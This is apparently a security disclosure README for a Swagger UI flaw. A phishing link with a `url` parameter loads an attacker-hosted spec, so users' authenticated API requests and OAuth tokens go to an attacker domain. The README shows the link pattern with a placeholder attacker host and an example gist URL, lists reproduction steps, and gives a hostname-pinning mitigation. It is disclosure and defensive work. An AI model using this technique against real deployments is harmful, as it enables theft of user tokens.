# PoC for a Swagger UI XSS vulnerability

## Reproduction

This XSS follows the following scenario:

1. User is sent a phishing link of the following form:

   ```
   https://<legitimate-domain>/?url=https://<attacker-domain>/api-docs.yaml
   ```

   Note that `https://<attacker-domain>/api-docs.yaml` can be an _exact copy_ of `https://<legitimate-domain>/api-docs.yaml`, to spoof it for the user.
   
   As an example, you can try `https://gist.githubusercontent.com/dinvlad/04a47bd905ef41ed9a22d115e5510f9d/raw/8374876ca31f651a49662eaf51312460b1d336ca/api-docs.yaml`
   as attacker's URL.

2. User authenticates over OAuth, and gets redirected back to `https://<legitimate-domain>/?url=https://<attacker-domain>/api-docs.yaml`.
3. User submits an API request to the server using Swagger UI.
4. Observe in the browser Network tab and in the Curl command that the authenticated request is actually sent to `https://<attacker-domain>`, instead of `https://<legitimate-domain>`. As such, the attacker can capture and exploit a valid user token produced by Google for the legitimate domain.

   In the example above, the request will be sent to `https://gist.githubusercontent.com`.

## Mitigation

Until (and if) this issue is addressed upstream by the Swagger UI team, please add the following parameter to the Swagger UI config:

```js
requestInterceptor: req => {
  req.hostname = window.location.hostname;
  return req;
},
```

As an example, please see how it's implemented in [index.html](https://github.com/broadinstitute/swagger-ui-xss-poc-fix/blob/57aa9a7820e0bc736eefbdb9f8725e464dd395d7/index.html#L57-L60).
You can serve this example locally using `node index.js`.
